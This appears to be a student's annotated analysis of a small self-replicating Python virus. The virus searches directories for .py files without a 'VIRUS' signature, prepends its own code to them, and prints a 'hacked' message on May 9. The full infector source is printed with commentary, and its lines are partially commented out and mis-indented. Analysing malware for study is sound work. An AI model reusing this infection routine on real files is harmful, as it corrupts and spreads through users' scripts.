





# First off, I started by using # to disable this script, preventing the potential accidental run of it. Then I began examining it.


#!/usr/bin/python3
import os
import datetime
# Here the code is creating a signature and defining it. Any lines with my comments pertaining to the assignment will be marked with ###.


SIGNATURE = "VIRUS"

###This first define is focused on a file path.

def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
 #   for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
            
     ###Here is looks like it wants to find files with the extension ".py". It looks like it wants to infect specificially python scripts.      
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
#                if SIGNATURE in line:
                    infected = True
                    break
        ### Here its taking any files that are "== false" and adding them to a list. A list it wants to target with something.
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

### This definition looks to be all about taking that target/hit list and modifying it. Line 45 looks to be about adding something to the first
### 39 lines of the code. Specifically, it is adding the virusstring itself to the first 39 lines. 
#def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
    ### Specifically telling it to add the virus string to lines 0-39.
            virusstring += line
    virus.close
    for fname in files_targeted:
         f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

        
  ### This line checks the date of the computer and sees if it matches what is written. It looks to be seeking May 9th with no specific year given.      
   ### If the date is May 9th, it is told to print "You have been hacked". 
    ### I feel the virus is aimed at printing a message to a screen. I am not sure the detonate does anything else.
    
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

#files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
#detonate()

### Summary.
### It is my suspicion that this virus is designed to seek out specific files ending in .py, to attach them to a master hit list. It then
### Infects this specific list. After which it lay dormant until the date reaches May 9th, of which the virus triggers causing a message to be printed.

